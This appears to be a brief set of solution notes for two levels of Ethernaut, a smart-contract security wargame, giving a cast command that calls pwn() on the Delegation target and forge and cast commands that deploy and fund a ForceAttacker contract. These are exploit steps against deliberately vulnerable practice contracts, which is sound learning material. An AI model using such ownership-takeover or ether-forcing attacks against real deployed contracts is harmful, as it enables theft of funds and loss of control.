# Ethernaut

## Delegation

```bash
cast send <TARGET_CONTRACT> "pwn()"
```

## Forge

```bash
# Deploy
forge create ForceAttacker --constructor-args <TARGET_CONTRACT>

# Attack
cast send --value 0.01ether <ATTACKER_CONTRACT>
```
